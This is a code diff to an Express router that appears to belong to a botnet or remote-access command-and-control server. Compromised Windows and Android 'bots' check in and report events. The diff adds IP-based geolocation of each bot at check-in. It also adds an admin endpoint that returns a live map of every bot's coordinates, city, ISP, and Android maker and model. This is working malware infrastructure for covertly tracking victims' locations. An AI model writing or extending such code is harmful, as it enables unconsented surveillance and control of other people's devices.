@@ -11,6 +11,8 @@ const { runDetection }            = require("../controllers/detectionEngine");
 const { computeRiskScore }        = require("../controllers/detectionEngine");
 const { bots: _bots }             = require("../state");
 const persist                     = require("../persist");
+const { geoIp }                   = require("../utils/geoip");
+const { requireAdmin }            = require("../middleware/auth");
 
 const router = express.Router();
 
@@ -39,6 +41,18 @@ router.get("/checkin", (req, res) => {
   bot.info     = info;
   bot.lastSeen = new Date().toISOString();
   recordNetlog(bot, req, res, 0);
+
+  // IP geolocation for Windows bots (fire-and-forget, city-level only)
+  if (!bot.lastLoc) {
+      const clientIp = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "";
+      geoIp(clientIp).then(geo => {
+          if (geo && bot) {
+              bot.lastLoc = { time: new Date().toISOString(), lat: geo.lat, lon: geo.lon, acc: null, city: geo.city, country: geo.country, isp: geo.isp, source: "ip" };
+              persist.scheduleSave();
+          }
+      }).catch(() => {});
+  }
+
   console.log(`[+] Checkin  bot=${id}`);
   res.status(200).send("");
 });
@@ -111,6 +125,32 @@ router.post("/event", express.json({ limit: "64kb" }), (req, res) => {
   recordNetlog(bot, req, res, JSON.stringify(evt).length);
 
   res.status(200).send("");
+});
+
+// ── Combined live location map — all bots (Windows + Android) ─────────────────
+router.get("/api/location/all", requireAdmin, (_req, res) => {
+    const points = Object.values(_bots)
+        .filter(b => b.lastLoc && !b.blocked)
+        .map(b => {
+            const isAndroid = b.info && b.info.includes("platform=android");
+            return {
+                id:       b.id,
+                platform: isAndroid ? "android" : "windows",
+                lat:      b.lastLoc.lat,
+                lon:      b.lastLoc.lon,
+                acc:      b.lastLoc.acc,
+                city:     b.lastLoc.city    || null,
+                country:  b.lastLoc.country || null,
+                isp:      b.lastLoc.isp     || null,
+                source:   b.lastLoc.source  || "gps",
+                time:     b.lastLoc.time,
+                lastSeen: b.lastSeen,
+                label:    isAndroid
+                    ? (b.info.match(/mfr=([^|]+)/)?.[1] || "") + " " + (b.info.match(/model=([^|]+)/)?.[1] || "")
+                    : (b.info ? b.info.slice(0, 40) : b.id.slice(0, 16)),
+            };
+        });
+    res.json(points);
 });
 
 module.exports = router;
